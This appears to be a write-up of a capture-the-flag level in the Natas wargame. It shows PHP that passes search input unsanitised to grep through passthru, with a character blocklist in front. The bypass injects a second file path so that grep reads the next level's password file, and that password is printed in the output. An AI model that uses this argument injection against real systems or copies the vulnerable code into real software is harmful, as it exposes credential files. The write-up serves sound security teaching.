We are given the same input field from the previous level, only this time with a message above the input line:

***For security reasons, we now filter on certain characters***

Let's take a look at the source code they've provided:

```
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

Rats; they've added some input validation, disallowing semicolons and ampersands. However, there is a key thing to point out about the syntax of the `grep` command used: you can use grep to search through multiple files. So while the current command is searching for our input within dictionary.txt, let's also get it to search through /etc/natas_webpass/natas11:

**`Find words containing: a /etc/natas_webpass/natas11`**  
```
Output:

/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
...
...
```

This happened to work because the password contains the character "a". If it didn't, we'd be forced to go character by character until we selected a character present in the password. 
